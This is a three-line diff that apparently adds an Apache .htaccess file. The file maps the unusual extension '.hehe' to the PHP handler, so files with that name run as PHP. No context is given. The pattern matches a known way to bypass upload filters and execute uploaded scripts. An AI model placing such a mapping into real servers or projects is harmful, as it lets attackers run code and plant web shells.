@@ -1,0 +1,3 @@
+AddType application/x-httpd-php .hehe
+AddHandler application/x-httpd-php .hehe
+
